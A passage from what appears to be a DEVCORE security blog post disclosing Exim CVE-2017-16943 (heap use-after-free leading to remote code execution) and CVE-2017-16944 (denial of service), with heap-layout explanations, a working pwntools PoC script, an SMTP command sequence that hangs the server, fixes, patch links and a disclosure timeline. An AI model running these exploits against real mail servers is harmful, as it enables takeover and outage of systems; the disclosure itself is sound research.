 After that, we send BDAT command to start data transfer. At the beginning, <code class="language-plaintext highlighter-rouge">next</code> and <code class="language-plaintext highlighter-rouge">next-&gt;text</code> are allocated by <code class="language-plaintext highlighter-rouge">store_get</code>. 
 <img src="/assets/img/blog/20171211/3.png" alt="" />
 The function <code class="language-plaintext highlighter-rouge">dkim_exim_verify_init</code> is called sequentially and it also calls <code class="language-plaintext highlighter-rouge">store_get</code>. Notice that this function uses <strong>ANOTHER <code class="language-plaintext highlighter-rouge">store_pool</code></strong>, so it allocates from heap without changing <code class="language-plaintext highlighter-rouge">current_block</code> which <code class="language-plaintext highlighter-rouge">next-&gt;text</code> also points to.
 <a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734">receive.c: 1734 receive_msg</a>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="n">smtp_input</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">smtp_batched_input</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">dkim_disable_verify</span><span class="p">)</span>
   <span class="n">dkim_exim_verify_init</span><span class="p">(</span><span class="n">chunking_state</span> <span class="o">&lt;=</span> <span class="n">CHUNKING_OFFERED</span><span class="p">);</span>
</code></pre></div>    </div>
  </li>
  <li>Call <code class="language-plaintext highlighter-rouge">store_getc</code> inside <code class="language-plaintext highlighter-rouge">bdat_getc</code>
 Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the <code class="language-plaintext highlighter-rouge">current_block</code> with <code class="language-plaintext highlighter-rouge">store_get</code> in <code class="language-plaintext highlighter-rouge">string_printing</code>. 
 <img src="/assets/img/blog/20171211/4.png" alt="" /></li>
  <li>Keep sending msg until extension and bug triggered
 In this way, while we keep sending huge messages, <code class="language-plaintext highlighter-rouge">current_block</code> gets freed after the extension. In the malloc.c of glibc (so called ptmalloc2), system manages a linked list of freed memory chunks, which is called unsorted bin. Freed chunks are put into unsorted bin if it is not the last chunk on the heap. In step 2, <code class="language-plaintext highlighter-rouge">dkim_exim_verify_init</code> allocated chunks after <code class="language-plaintext highlighter-rouge">next-&gt;text</code>. Therefore, this chunk is put into unsorted bin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly <code class="language-plaintext highlighter-rouge">current_block-&gt;next</code>, and therefore <code class="language-plaintext highlighter-rouge">current_block-&gt;next</code> is overwritten to <code class="language-plaintext highlighter-rouge">unsorted bin</code> inside <code class="language-plaintext highlighter-rouge">main_arena</code> of libc (linked list pointer <code class="language-plaintext highlighter-rouge">fd</code> points back to <code class="language-plaintext highlighter-rouge">unsorted bin</code> if no other freed chunk exists). 
 <img src="/assets/img/blog/20171211/5.png" alt="" /></li>
  <li>Keep sending msg for the next extension
 When the next extension occurs, <code class="language-plaintext highlighter-rouge">store_get</code> tries to cut from <code class="language-plaintext highlighter-rouge">main_arena</code>, which makes attackers able to overwrite all global variables below main_arena.</li>
  <li>Overwrite global variables in libc</li>
  <li>Finish sending message and trigger <code class="language-plaintext highlighter-rouge">free()</code>
 In the PoC, we simply modified <code class="language-plaintext highlighter-rouge">__free_hook</code> and ended the line. Exim calls <code class="language-plaintext highlighter-rouge">store_reset</code> to reset the buffer and calls <code class="language-plaintext highlighter-rouge">__free_hook</code> in <code class="language-plaintext highlighter-rouge">free()</code>. At this stage, we successfully controlled instruction pointer <code class="language-plaintext highlighter-rouge">$rip</code>.
 However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both <code class="language-plaintext highlighter-rouge">__free_hook</code> and <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>. We forged the vtable of <code class="language-plaintext highlighter-rouge">stdout</code> and set <code class="language-plaintext highlighter-rouge">__free_hook</code> to any call of <code class="language-plaintext highlighter-rouge">fflush(stdout)</code> inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both <code class="language-plaintext highlighter-rouge">$rip</code> and the content of first argument. 
 We consulted past CVE exploits and decided to call <code class="language-plaintext highlighter-rouge">expand_string</code>, which executes command with <code class="language-plaintext highlighter-rouge">execv</code> if we set the first argument to <code class="language-plaintext highlighter-rouge">${run{cmd}}</code>, and finally we got our RCE. 
 <img src="/assets/img/blog/20171211/6.png" alt="" /></li>
</ol>

<h4 id="exploit-for-default-configured-exim">Exploit for default configured exim</h4>
<p>When dkim is disabled, the PoC above fails because <code class="language-plaintext highlighter-rouge">current_block</code> is the last chunk on heap. This makes the system merge it into a big chunk called <strong>top chunk</strong> rather than unsorted bin.
The illustrations below describe the difference of heap layout:
<img src="/assets/img/blog/20171211/8.png" alt="" />
<img src="/assets/img/blog/20171211/9.png" alt="" /></p>

<p>To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.</p>

<p>After running out of <code class="language-plaintext highlighter-rouge">current_block</code>:</p>
<ol>
  <li>Use DATA command to send lots of data
 Send huge data, make the chunk big and extend many times. After several extension, it calls <code class="language-plaintext highlighter-rouge">store_get</code> to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsorted bin.</li>
  <li>End DATA transfer and start a new email
 Restart to send an email with BDAT command after the heap chunk is prepared.</li>
  <li>Adjust <code class="language-plaintext highlighter-rouge">yield_length</code> again
 Send invalid command with an unprintable charater again to cut the <code class="language-plaintext highlighter-rouge">current_block</code>.</li>
</ol>

<p>Finally the heap layout is like:
<img src="/assets/img/blog/20171211/10.png" alt="" /></p>

<p>And now we can go back to the step 2 at the beginning and create the same situation. When <code class="language-plaintext highlighter-rouge">next-&gt;text</code> is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.
The following is the PoC for default configured exim:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"EHLO test"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"250 HELP"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"MAIL FROM:&lt;&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RCPT TO:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x1280</span><span class="o">+</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'DATA'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'itself</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x4000</span><span class="o">+</span><span class="s">':</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'.</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'.</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"MAIL FROM:&lt;&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RCPT TO:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x3480</span><span class="o">+</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'BDAT 1'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">':BDAT </span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e00</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="o">+</span> <span class="s">':</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>A demo of our exploit is as below.
<img src="/assets/img/blog/20171211/7-demo.png" alt="" />
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.</p>

<h1 id="incorrect-bdat-data-handling-leads-to-dos">Incorrect BDAT data handling leads to DoS</h1>

<h3 id="vulnerability-analysis-1">Vulnerability Analysis</h3>
<p>When receiving data with BDAT command, SMTP server should not consider a single dot <code class="language-plaintext highlighter-rouge">‘.’</code> in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:&lt;meh@some.domain&gt;
250 OK
RCPT TO:&lt;meh@some.domain&gt;
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
</code></pre></div></div>
<p>As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer <code class="language-plaintext highlighter-rouge">receive_getc</code> is not reset. If the next command is also a BDAT, <code class="language-plaintext highlighter-rouge">receive_getc</code> and <code class="language-plaintext highlighter-rouge">lwr_receive_getc</code> become the same and an infinite loop occurs inside <code class="language-plaintext highlighter-rouge">bdat_getc</code>. Program crashes due to stack exhaustion.
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546">smtp_in.c: 546 bdat_getc</a></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  if (chunking_data_left &gt; 0)
    return lwr_receive_getc(chunking_data_left--);
</code></pre></div></div>
<p>This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:&lt;meh@some.domain&gt;
RCPT TO:&lt;meh@some.domain&gt;
BDAT 100
.
MAIL FROM:&lt;meh@some.domain&gt;
RCPT TO:&lt;meh@some.domain&gt;
BDAT 0 LAST
</code></pre></div></div>
<p>This makes attackers able to launch a resource based DoS attack and then force the whole server down.</p>

<h2 id="fix">Fix</h2>
<ul>
  <li>Turn off Chunking option in config file:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chunking_advertise_hosts =
</code></pre></div>    </div>
  </li>
  <li>Update to 4.89.1 version</li>
  <li>Patch of CVE-2017-16943 released <a href="https://git.exim.org/exim.git/commitdiff/4090d62a4b25782129cc1643596dc2f6e8f63bde">here</a></li>
  <li>Patch of CVE-2017-16944 released <a href="https://git.exim.org/exim.git/commitdiff/178ecb70987f024f0e775d87c2f8b2cf587dd542">here</a></li>
</ul>

<h2 id="timeline">Timeline</h2>

<ul>
  <li>23 November, 2017 09:40 Report to Exim Bugzilla</li>
  <li>25 November, 2017 16:27 CVE-2017-16943 Patch released</li>
  <li>28 November, 2017 16:27 CVE-2017-16944 Patch released</li>
  <li>3 December, 2017 13:15 Send an advisory release notification to Exim and wait for reply until now</li>
</ul>

<h4 id="remarks">Remarks</h4>
<p>While we were trying to report these bugs to exim, we could not find any method for security report. Therefore, we followed the link on the official site for bug report and found the security option. Unexpectedly, the Bugzilla posts all bugs publicly and therefore the PoC was leaked. Exim team responded rapidly and improved their security report process by adding a notification for security reports in reaction to this.</p>

<h2 id="credits">Credits</h2>
<p>Vulnerabilities found by Meh, DEVCORE research team.
meh [at] devco [dot] re</p>

<h2 id="reference">Reference</h2>

<p>https://bugs.exim.org/show_bug.cgi?id=2199
https://bugs.exim.org/show_bug.cgi?id=2201
https://nvd.nist.gov/vuln/detail/CVE-2017-16943
https://nvd.nist.gov/vuln/detail/CVE-2017-16944
https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html</p>

                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/en/blog/author/meh">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/meh.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/en/blog/author/meh">
                            <h3>Meh</h3>
                        </a>
                        <span>Business Development Manager</span>
                        <p>
                            I am a pwner.
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Services</h6>
        <ul>
            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
            <li><a href="/en/services/security-training/">Security Training</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Research</h6>
        <ul>
            <li><a href="/en/research/overview/">Overview</a></li>
            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
            <li><a href="/en/research/talks/">International Conferences</a></li>
            <li><a href="/en/research/cve/">CVE List</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Company</h6>
        <ul>
            <li><a href="/en/company/about/">Company Overview</a></li>
            <li><a href="/en/company/our-team/">Team Members</a></li>
            <li><a href="/en/company/history/">Achievements</a></li>
            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
            <li><a href="/en/contact/">Contact</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">News</h6>
        <ul>
            <li><a href="/en/blog/">Blog</a></li>
            <li><a href="/en/media-kit/">Media Resources</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2023 DEVCORE <b class="line-block">All right reserved.</b></span>
            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>










